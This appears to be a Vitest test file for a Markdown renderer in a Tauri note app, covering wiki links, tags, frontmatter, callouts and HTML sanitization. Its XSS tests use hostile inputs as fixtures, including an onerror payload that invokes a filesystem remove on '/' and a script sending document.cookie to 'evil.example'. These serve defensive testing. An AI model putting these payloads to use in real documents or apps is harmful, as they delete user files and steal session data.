// @vitest-environment jsdom
// renderMarkdown sanitizes its output through DOMPurify, which needs a DOM;
// the extraction tests below are DOM-agnostic and run fine under jsdom too.
import { describe, it, expect } from "vitest";
import {
  extractLinks,
  extractTags,
  extractFirstImage,
  parseFrontmatter,
  extractAliases,
  renderMarkdown,
  sanitizeHtml,
} from "./markdown";

describe("extractLinks", () => {
  it("captures wiki links and strips aliases", () => {
    expect(extractLinks("see [[Note]] and [[Other|alias]]")).toEqual([
      "Note",
      "Other",
    ]);
  });

  it("excludes image embeds but keeps note embeds", () => {
    expect(extractLinks("![[pic.png]] then ![[Embedded Note]]")).toEqual([
      "Embedded Note",
    ]);
  });

  it("resolves standard markdown links to local .md files", () => {
    const src = "[a](Note.md) [b](sub/Deep.md) [c](https://x.com) [d](page.html)";
    expect(extractLinks(src)).toEqual(["Note.md", "sub/Deep.md"]);
  });

  it("decodes url-encoded markdown links and drops anchors", () => {
    expect(extractLinks("[x](My%20Note.md#heading)")).toEqual(["My Note.md"]);
  });
});

describe("extractTags", () => {
  it("finds hashtags but not headings or code", () => {
    const src = "# Heading\n#alpha and #beta/gamma\n```\n#notatag\n```";
    expect(extractTags(src).sort()).toEqual(["alpha", "beta/gamma"]);
  });
});

describe("extractFirstImage", () => {
  it("prefers embeds then markdown images", () => {
    expect(extractFirstImage("text ![[shot.png]] more")).toBe("shot.png");
    expect(extractFirstImage("![](a.jpg)")).toBe("a.jpg");
    expect(extractFirstImage("no images here")).toBeNull();
  });
});

describe("frontmatter", () => {
  it("parses key/values and returns the body", () => {
    const { body, props } = parseFrontmatter(
      "---\ntitle: Hello\naliases: [x, y]\n---\nthe body"
    );
    expect(body).toBe("the body");
    expect(props).toContainEqual(["title", "Hello"]);
  });

  it("extracts aliases (list and scalar forms)", () => {
    expect(extractAliases("---\naliases: [Foo, Bar]\n---\n")).toEqual([
      "Foo",
      "Bar",
    ]);
    expect(extractAliases('---\nalias: "Baz"\n---\n')).toEqual(["Baz"]);
    expect(extractAliases("no frontmatter")).toEqual([]);
  });
});

describe("renderMarkdown", () => {
  it("renders a Properties block from frontmatter", () => {
    const html = renderMarkdown("---\ntitle: T\n---\n# Body");
    expect(html).toContain('class="properties"');
    expect(html).toContain("title");
  });

  it("renders Obsidian callouts", () => {
    const html = renderMarkdown("> [!note] Heads up\n> body text");
    expect(html).toContain('class="callout"');
    expect(html).toContain('data-callout="note"');
    expect(html).toContain("Heads up");
  });

  it("renders wiki links and image embeds with data attributes", () => {
    const html = renderMarkdown("[[Target]] and ![[img.png]]");
    expect(html).toContain('class="wikilink"');
    expect(html).toContain('data-target="Target"');
    expect(html).toContain('data-embed="img.png"');
  });

  it("passes benign raw HTML through (quotes normalized by the sanitizer)", () => {
    const html = renderMarkdown("<div class='x'>hi</div>");
    expect(html).toContain('class="x"');
    expect(html).toContain(">hi</div>");
  });
});

describe("sanitizeHtml / renderMarkdown XSS defense", () => {
  // The rendered HTML is injected with dangerouslySetInnerHTML into the trusted
  // Tauri app document, where an inline handler could call
  // window.__TAURI_INTERNALS__.invoke (arbitrary fs under the ** scope). Notes
  // are not always trusted (imported vaults, synced peers, agent-written files),
  // so every script-execution vector must be stripped while benign formatting
  // survives. These assert on both renderMarkdown (the real path) and the
  // exported sanitizeHtml (the same policy) for raw-HTML inputs.

  it("strips <script> tags", () => {
    const out = sanitizeHtml("<p>ok</p><script>steal()</script>");
    expect(out).toContain("ok");
    expect(out.toLowerCase()).not.toContain("<script");
    expect(out).not.toContain("steal()");
  });

  it("strips inline event handlers (the img onerror vector)", () => {
    const out = sanitizeHtml('<img src="x" onerror="pwn()">');
    expect(out.toLowerCase()).not.toContain("onerror");
    expect(out).not.toContain("pwn()");
  });

  it("strips javascript: URLs on links", () => {
    const out = sanitizeHtml('<a href="javascript:pwn()">click</a>');
    expect(out.toLowerCase()).not.toContain("javascript:");
    expect(out).toContain("click");
  });

  it("strips svg/onload and other handler-bearing elements", () => {
    const out = sanitizeHtml('<svg><animate onbegin="pwn()"></svg>');
    expect(out.toLowerCase()).not.toContain("onbegin");
    expect(out).not.toContain("pwn()");
  });

  it("forbids iframe/object/embed/base/form framing & plugin vectors", () => {
    const out = sanitizeHtml(
      '<iframe src="data:text/html,<script>pwn()</script>"></iframe>' +
        '<object data="x"></object><embed src="x">' +
        '<base href="http://evil"><form action="http://evil"></form>'
    );
    const lower = out.toLowerCase();
    for (const tag of ["<iframe", "<object", "<embed", "<base", "<form"]) {
      expect(lower).not.toContain(tag);
    }
  });

  it("neutralizes the vector end-to-end through renderMarkdown", () => {
    const evil =
      "# Note\n\nnormal text\n\n" +
      '<img src=x onerror="window.__TAURI_INTERNALS__.invoke(\'plugin:fs|remove\',{path:\'/\'})">\n\n' +
      "<script>fetch('https://evil.example/'+document.cookie)</script>";
    const html = renderMarkdown(evil);
    const lower = html.toLowerCase();
    expect(html).toContain("normal text"); // benign content preserved
    expect(lower).not.toContain("onerror");
    expect(lower).not.toContain("<script");
    expect(html).not.toContain("__TAURI_INTERNALS__");
  });

  it("preserves the app's own emitted markup (wikilinks, embeds, callouts, tasks)", () => {
    const html = renderMarkdown(
      "> [!note] Title\n> body\n\n[[Target]] and ![[img.png]]\n\n- [x] done\n- [ ] todo"
    );
    expect(html).toContain('data-target="Target"');
    expect(html).toContain('data-embed="img.png"');
    expect(html).toContain('data-callout="note"');
    expect(html).toContain('class="wikilink"');
  });

  it("keeps safe links and images with http(s)/relative sources", () => {
    const out = sanitizeHtml(
      '<a href="https://example.com">x</a><img src="images/local.png">'
    );
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('src="images/local.png"');
  });
});
